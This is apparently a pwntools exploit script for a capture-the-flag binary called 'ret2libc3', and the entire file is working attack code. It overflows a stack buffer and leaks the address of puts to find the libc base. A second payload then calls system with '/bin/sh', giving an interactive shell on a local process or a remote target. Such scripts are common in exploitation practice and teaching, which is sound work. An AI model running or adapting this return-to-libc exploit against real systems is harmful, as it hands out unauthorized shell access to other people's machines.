from pwn import *
import sys

debug = False
if len(sys.argv)<2:
	p = process('./ret2libc3')
	elf = ELF('./ret2libc3')
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
else:
	p = remote(ip,addr)
	elf = ELF('./ret2libc3')
	libc = ELF("libc.so.6")

#Dynelf	

puts_plt = elf.plt['puts']
puts_got = elf.got["puts"]
main_addr = elf.symbols['main']
pop_ebp_ret = 0x080486ff

payload1 = "a"*0x64 + "junkjunk" + "junk" + p32(puts_plt) + p32(pop_ebp_ret) + p32(puts_got) + p32(main_addr)

#esp youhua 8 

p.sendlineafter('Can you find it !?',payload1)

#print p.recv()
#p.recvuntil("\n\n",drop=True)
puts_addr = u32(p.recv(4))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload2 = "a"*0x64 + "junkjunk" + "junk" + p32(system_addr) + "junk" + p32(binsh)
#gdb.attach(p)
p.sendlineafter('Can you find it !?',payload2)
p.interactive()
